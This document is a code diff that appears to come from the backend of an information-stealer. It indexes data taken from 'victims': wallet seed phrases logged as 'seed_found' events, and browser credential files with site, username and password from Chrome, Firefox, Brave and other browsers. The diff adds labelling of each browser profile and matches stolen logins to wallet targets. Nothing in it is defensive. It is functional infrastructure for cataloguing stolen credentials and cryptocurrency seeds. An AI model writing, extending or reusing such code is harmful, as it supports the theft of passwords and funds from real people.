@@ -686,7 +686,7 @@ async function createSeedEvent(victimId: string, value: string, path: string, ki
   }).catch(() => null);
   if (existing) return;
   await prisma.event.create({
-    data: { victimId, kind: 'seed_found', data: { path, type: kind ?? 'seed', words: words ?? 0, value, hash, artifactId: artifactId ?? null } as never }
+    data: { victimId, kind: 'seed_found', data: { path, type: kind ?? 'seed', words: words ?? 0, preview: `${value.trim().split(/\s+/).slice(0, 2).join(' ')} … ${value.trim().split(/\s+/).at(-1) ?? ''}`, hash, artifactId: artifactId ?? null } as never }
   });
 }
 
@@ -709,15 +709,23 @@ async function indexTextFile(victimId: string, path: string, name: string): Prom
   }
 }
 
-async function indexCredentialFile(victimId: string, artifactId: string, path: string): Promise<void> {
+function credentialTarget(store: string): string {
+  const parts = store.split('/').filter(Boolean);
+  const browser = ['chrome', 'chromium', 'edge', 'brave', 'firefox', 'librewolf', 'opera', 'vivaldi', 'safari']
+    .find((name) => parts.includes(name));
+  const profile = parts.at(-1) || 'default';
+  return browser ? `${browser}/${profile}` : parts.slice(-2).join('/') || 'browser';
+}
+
+async function indexCredentialFile(victimId: string, artifactId: string, path: string, wallets: Array<{ path: string; targetId: string }>): Promise<void> {
   try {
     const parsed = JSON.parse(await readFile(path, 'utf8')) as {
       browser_state?: string;
       mode?: string;
       logins?: Array<{ origin?: string; username?: string; password?: string }>;
     };
-    const targetId = normalizePath(parsed.browser_state ?? path).split('/').slice(-3, -1).join('/') || 'browser';
     const store = normalizePath(parsed.browser_state ?? path);
+    const targetId = wallets.find((wallet) => normalizePath(wallet.path) === store)?.targetId ?? credentialTarget(store);
     const rows = (parsed.logins ?? []).map((login) => ({
       path: store,
       url: login.origin ?? null,
@@ -789,7 +797,7 @@ async function indexArtifact(artifactId: string, victimId: string, manifest: Man
     for (const entry of manifest.artifacts) {
       const lower = entry.path.toLowerCase();
       if (lower.startsWith('credentials/') && lower.endsWith('.json')) {
-        await indexCredentialFile(victimId, artifactId, join(root, safeRel(entry.path)));
+        await indexCredentialFile(victimId, artifactId, join(root, safeRel(entry.path)), wallets);
       } else if (lower.endsWith('/findings.json') && lower.startsWith('wallets/')) {
         const target = entry.path.split('/')[1] ?? 'unknown';
         const targetWallets = wallets.filter((wallet) => wallet.targetId === target);
